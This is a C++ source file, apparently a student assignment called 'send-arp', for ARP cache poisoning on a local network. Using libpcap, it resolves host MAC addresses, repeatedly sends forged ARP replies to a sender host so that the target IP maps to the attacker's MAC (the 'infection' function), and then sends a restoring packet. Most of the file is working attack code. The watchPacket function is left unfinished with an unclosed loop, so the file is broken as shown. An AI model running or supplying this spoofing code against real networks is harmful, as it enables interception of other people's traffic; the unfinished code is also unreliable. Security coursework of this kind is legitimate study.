#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <utility>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"
// thread
#include <thread>
// getMyIp
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
//
#define SUCCESS 1
#define FAIL -1

#pragma pack(push, 1) 
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;

	// 복사 생성자
	EthArpPacket() {}
	EthArpPacket(const EthArpPacket& r) { memcpy(&(this->eth_), &(r.eth_), sizeof(EthArpPacket)); }

};
#pragma pack(pop)

using std::cout;
using std::ifstream;
using std::string;
using std::cerr;
using std::pair;
using std::vector;
using std::map;
using std::endl;

void usage() {
	cout << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]" << endl;
	cout << "sample : send-arp wlan0 192.168.10.2 192.168.10.1" << endl;
}

Mac getMyMac(char* dev) {
	// 리눅스의 경우
	// /sys/class/net/[dev]/address
	ifstream fin;
	string path = "/sys/class/net/" + string(dev) +"/address";
	fin.open(path);

	if (fin.fail()) {
		cerr << "Error: " << strerror(errno);
		return Mac::nullMac(); // FAIL이면 null 맥 리턴
		//return FAIL;
	}

	string tmp;
	fin >> tmp;
	fin.close();

	return Mac(tmp);
	//return SUCCESS;
}

EthArpPacket fillPacket(Mac& smac1, Mac& dmac, Mac& smac2, Ip& sip, Mac& tmac, Ip& tip, uint16_t type) {
	EthArpPacket packet;
	packet.eth_.dmac_ = dmac;
	packet.eth_.smac_ = smac1;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(type);
	packet.arp_.smac_ = smac2;
	packet.arp_.sip_ = htonl(sip);
	packet.arp_.tmac_ = tmac;
	packet.arp_.tip_ = htonl(tip);

	return packet;
}

int sendARP(EthArpPacket& packet, pcap_t* handle) {
	// critical section
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	//
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return FAIL;
	}
	return SUCCESS;
}

int parsePacket(pcap_t* handle, EthArpPacket& send, map<Ip, Mac>& table) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;

	while (1) {
		// critical section
		int res = pcap_next_ex(handle, &pkheader, &packet);
		//
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			fprintf(stderr, "pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return FAIL;
		}
		
		// ETH-ARP 패킷인지 확인하고 
		EthArpPacket header;
		memcpy(&header, packet, 42);
	
		// => ETH의 type정보를 확인
		if(header.eth_.type_ != htons(EthHdr::Arp)) continue;

		// reply 패킷인지 확인
		if(header.arp_.op_ != htons(ArpHdr::Reply)) continue;

		// send를 바탕으로 send에 대한 reply인지 확인
		if(send.eth_.smac_ != header.eth_.dmac_) continue;
		if(send.arp_.smac_ != header.arp_.tmac_) continue;
		if(send.arp_.sip_ != header.arp_.tip_) continue;
		if(send.arp_.tip_ != header.arp_.sip_) continue;

		header.arp_.sip_ = ntohl(header.arp_.sip_);
		table.insert({header.arp_.sip_, header.arp_.smac_});
		return SUCCESS;
	}
}

int resolveMac(pcap_t* handle, map<Ip, Mac>& table, Ip& sip, Ip& tip) {
	EthArpPacket packet = fillPacket(table.find(sip)->second, Mac::broadcastMac(), table.find(sip)->second, sip, Mac::nullMac(), tip, ArpHdr::Request);
	return sendARP(packet, handle) && parsePacket(handle, packet, table);
}

Ip getMyIp(char* dev) {
	int fd;
    struct ifreq ifr;
 
    fd = socket(AF_INET, SOCK_DGRAM, 0);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    ifr.ifr_addr.sa_family = AF_INET;
   	strncpy(ifr.ifr_name, dev, IFNAMSIZ -1);
    
   	ioctl(fd, SIOCGIFADDR, &ifr);
	if(fd < 0) {
		cerr << "Error: " << strerror(errno);
		return FAIL;
	}
    close(fd);
     
    return Ip(ntohl(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr.s_addr));
}

int getMyInfo(char* dev, map<Ip, Mac>& table) {
	Mac myMac = getMyMac(dev);
	if(myMac == Mac::nullMac()) return FAIL;
	table.insert({getMyIp(dev), myMac});
	return SUCCESS;
}

void recover(pcap_t* handle, map<Ip, Mac>& table, Ip& sender, Ip& target) {
	EthArpPacket packet = fillPacket(table.find(target)->second, table.find(sender)->second, table.find(target)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);
	sendARP(packet, handle);
}

void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target) {
	// EthArpPacket packet = fillPacket(table[0].second, table[1].second, table[0].second, table[2].first, table[1].second, table[1].first, ArpHdr::Reply);
	EthArpPacket packet = fillPacket(table.find(me)->second, table.find(sender)->second, table.find(me)->second, target, table.find(sender)->second, sender, ArpHdr::Reply);

	// table[0] : me
	// table[1] : sender
	// table[2] : target
	cout << "send" << endl;
	int i = 0;
	while(i < 5) {
		std::this_thread::sleep_for(std::chrono::milliseconds(3000));
		sendARP(packet, handle);
		i++;
	}
	recover(handle, table, sender, target);
	return;	
}

// infection 시켰으면 계속 감시해야 함.
// while문으로 돌려놓고 변수로 종료시키자
// 쓰레드
void watchPacket(pcap_t* handle, map<Ip, Mac> table) {
	struct pcap_pkthdr* pkheader;
	const u_char* packet;
	// parsePacket이랑 꼬이면 안됨
	// 해결책 선택
	// 1. parse(resolve)를 다 한 후에 공격을 한다
	// 벡터로 sender와 target을 묶기? 
	// 2. parse랑 watch를 통합한다.
	// 공유자원 문제 비스무리하게 .. 좀 복잡함.
	while (1) {
		// critical section
		int res = pcap_next_ex(handle, &pkheader, &packet);
		//
}


void initArg(char* argv[], Ip& sender, Ip& target) {
	sender = Ip(string(argv[0]));
	target = Ip(string(argv[1]));
}

void printTable(map<Ip, Mac>& table) {
	/*
	cout << "----Me----" << endl << "Ip:  " << string(table[0].first) << endl << "Mac: " << string(table[0].second) << endl;
	cout << "--Sender--" << endl << "Ip:  " << string(table[1].first) << endl << "Mac: " << string(table[1].second) << endl;
	cout << "--Target--" << endl << "Ip:  " << string(table[2].first) << endl << "Mac: " << string(table[2].second) << endl;
	*/
}
